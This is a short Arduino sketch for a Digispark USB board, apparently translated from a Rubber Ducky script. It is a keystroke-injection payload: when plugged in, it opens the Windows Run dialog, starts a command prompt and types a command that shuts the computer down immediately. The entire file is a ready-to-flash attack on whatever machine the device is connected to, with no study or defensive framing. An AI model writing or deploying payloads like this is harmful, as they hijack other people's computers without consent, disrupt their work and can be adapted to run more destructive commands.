
// Platform: Digispark

#include "DigiKeyboard.h"

// cmd
const uint8_t key_arr_0[] PROGMEM = {0,6, 0,16, 0,7};
// shutdown /s /t 0
const uint8_t key_arr_1[] PROGMEM = {0,22, 0,11, 0,24, 0,23, 0,7, 0,18, 0,26, 0,17, 0,44, 2,36, 0,22, 0,44, 2,36, 0,23, 0,44, 0,39};

void duckyString(const uint8_t* keys, size_t len) {  
    for(size_t i=0; i<len; i+=2) {
        DigiKeyboard.sendKeyStroke(pgm_read_byte_near(keys + i+1), pgm_read_byte_near(keys + i));
    }
}

void setup() {
    pinMode(1, OUTPUT); // Enable LED
    digitalWrite(1, LOW); // Turn LED off
    DigiKeyboard.sendKeyStroke(0); // Tell computer no key is pressed

    DigiKeyboard.delay(1000); // DELAY 1000
    DigiKeyboard.sendKeyStroke(21, 8); // GUI r
    DigiKeyboard.delay(500); // DELAY 500
    duckyString(key_arr_0, sizeof(key_arr_0)); // STRING cmd
    DigiKeyboard.delay(500); // DELAY 500
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(1000); // DELAY 1000
    duckyString(key_arr_1, sizeof(key_arr_1)); // STRING shutdown /s /t 0
    DigiKeyboard.delay(500); // DELAY 500
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
}

void loop() {}
